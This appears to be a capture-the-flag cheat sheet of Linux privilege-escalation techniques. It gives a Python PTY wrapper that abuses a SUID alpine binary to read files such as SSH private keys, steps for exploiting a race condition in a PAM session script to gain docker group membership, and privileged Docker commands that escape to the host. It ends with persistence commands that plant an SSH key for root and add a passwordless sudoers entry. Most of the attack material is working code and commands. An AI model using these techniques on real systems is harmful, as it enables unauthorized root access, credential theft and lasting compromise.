# Advanced CTF Exploitation Techniques

## Alpine SUID File Extraction

### Python PTY Wrapper

```python
import pty, os, select, time

def alpine_extract(suid_binary, target_file, output_file):
    """
    Use a SUID binary (like alpine) to read a file as its owner.
    suid_binary: path to SUID binary (e.g., /usr/bin/alpine)
    target_file: file to read as SUID owner (e.g., /home/user/.ssh/id_rsa)
    output_file: where to save the extracted content
    """
    master, slave = pty.openpty()
    pid = os.fork()
    
    if pid == 0:
        os.close(master)
        os.setsid()
        sf = os.open(os.ttyname(slave), os.O_RDWR)
        os.dup2(sf, 0)
        os.dup2(sf, 1)
        os.dup2(sf, 2)
        if sf > 2:
            os.close(sf)
        os.close(slave)
        
        # Set HOME so alpine creates its config in a writable location
        os.environ['HOME'] = '/dev/shm'
        os.environ['TERM'] = 'xterm'
        
        # Run alpine to view the target file
        os.execve(suid_binary, [suid_binary, '-F', target_file], os.environ)
    
    os.close(slave)
    out = open(output_file, 'wb')
    while True:
        r, _, _ = select.select([master], [], [], 5)
        if r:
            try:
                d = os.read(master, 8192)
                if not d:
                    break
                out.write(d)
                out.flush()
            except:
                break
        else:
            break
    out.close()
    os.waitpid(pid, 0)
    return output_file
```

### Manual PTY Extraction Steps

1. Clean up previous alpine state:
   ```bash
   rm -rf /dev/shm/.pinerc /dev/shm/mail /dev/shm/*
   ```

2. Run alpine with `-F` flag to view target file via Python PTY script

3. In the alpine file viewer, press `S` to save, then enter the output path

4. Read the saved file (it will be owned by the SUID binary's owner)

## PAM Session Script Exploitation

### Finding PAM Escalation Vectors

```bash
# Check for pam_exec.so in SSH PAM config
grep pam_exec /etc/pam.d/sshd

# Look for scripts that modify group membership
cat /usr/local/bin/*docker*.sh

# Check if docker-sessions directory is world-writable
ls -la /run/docker-sessions/
```

### Common PAM Script Pattern

```bash
#!/bin/bash
USER="${PAM_USER}"
COUNT_FILE="/run/docker-sessions/${USER}.count"

if [ ! -f "$COUNT_FILE" ]; then
    echo 0 > "$COUNT_FILE"
fi

COUNT=$(cat "$COUNT_FILE")
COUNT=$((COUNT + 1))
echo "$COUNT" > "$COUNT_FILE"

if [ "$COUNT" -eq 1 ]; then
    # First login: add to group after delay
    (sleep 10; /usr/sbin/usermod -aG docker "$USER" 2>/dev/null || true) &
else
    # Subsequent logins: remove from group
    gpasswd -d "$USER" docker 2>/dev/null || true
fi
```

### Exploitation Steps

1. Delete counter file if it exists: `rm /run/docker-sessions/user.count`
2. SSH login → triggers add-docker-group.sh (count=1, starts background process)
3. Wait 10-12 seconds for background process to complete
4. User is now in the docker group (`getent group docker` shows user)
5. Use `sg docker -c "docker ps"` or SUID setresuid + sg to access Docker

### Race Condition Notes

- The removal script runs on logout, but the addition happens after 10s
- If you login, wait 10s, then login again, the second login's removal happens immediately
- But the first login's background process still runs and adds the group
- This creates a window where the user is in the docker group

## Docker Group Access Patterns

### Pattern 1: Direct Docker CLI (if session has docker group)

```bash
docker ps
docker images
docker run --rm --privileged -v /:/host alpine cat /host/root/flag.txt
```

### Pattern 2: sg Command (if user is in docker group in /etc/group)

```bash
sg docker -c "docker ps"
sg docker -c "docker run --rm --privileged -v /:/host alpine cat /host/root/flag.txt"
```

### Pattern 3: SUID setresuid + sg (if you have SUID binary)

```python
import ctypes, os, pty, select

libc = ctypes.CDLL('libc.so.6', use_errno=True)

# Set real UID to target user
libc.setresuid(1000, 1000, 1000)  # developer UID

# Now run sg docker -c "command" via PTY
master, slave = pty.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.setsid()
    sf = os.open(os.ttyname(slave), os.O_RDWR)
    os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
    if sf > 2: os.close(sf)
    os.close(slave)
    os.environ['HOME'] = '/home/developer'
    os.environ['TERM'] = 'xterm'
    os.execve('/usr/bin/sg', ['sg', 'docker', '-c', 'docker ps'], os.environ)

os.close(slave)
out = b''
while True:
    r, _, _ = select.select([master], [], [], 10)
    if r:
        try:
            d = os.read(master, 8192)
            if not d: break
            out += d
        except: break
    else: break
os.waitpid(pid, 0)
print(out.decode(errors='replace'))
```

## Docker Privileged Container Escape

### Read Host Files

```bash
# Single file
docker run --rm --privileged -v /:/host alpine cat /host/root/flag.txt

# Directory listing
docker run --rm --privileged -v /:/host alpine ls -la /host/root/

# Find flags
docker run --rm --privileged -v /:/host alpine find /host -name "*flag*" 2>/dev/null
```

### Get Root Shell

```bash
docker run --rm --privileged -v /:/host alpine chroot /host /bin/bash
```

### Persistent Access

```bash
# Add SSH key to root
docker run --rm --privileged -v /:/host alpine sh -c 'mkdir -p /host/root/.ssh && echo "ssh-ed25519..." >> /host/root/.ssh/authorized_keys'

# Add user to sudoers
docker run --rm --privileged -v /:/host alpine sh -c 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers'
```

## Common Pitfalls

1. **SUID binary doesn't preserve groups**: The SUID binary only changes effective UID, not supplementary groups. Use setresuid + sg to get group access.

2. **Docker socket permissions**: The socket is root:docker with 0660. You need the docker group in your supplementary groups, not just in /etc/group.

3. **PAM script timing**: The background sleep delay means you need to wait 10-12 seconds before the group is added. Don't try to use Docker immediately after login.

4. **SG requires TTY**: The sg command requires a TTY to prompt for password. Use PTY or provide empty password if the group doesn't require one.

5. **Docker privileged flag**: `--privileged` is required for full host access. Without it, you're still in a container namespace.

6. **Overlay filesystem issues**: In Docker-in-Docker setups, PHP-FPM may have permission issues reading files due to overlay filesystem. Restarting PHP-FPM after container start can help.
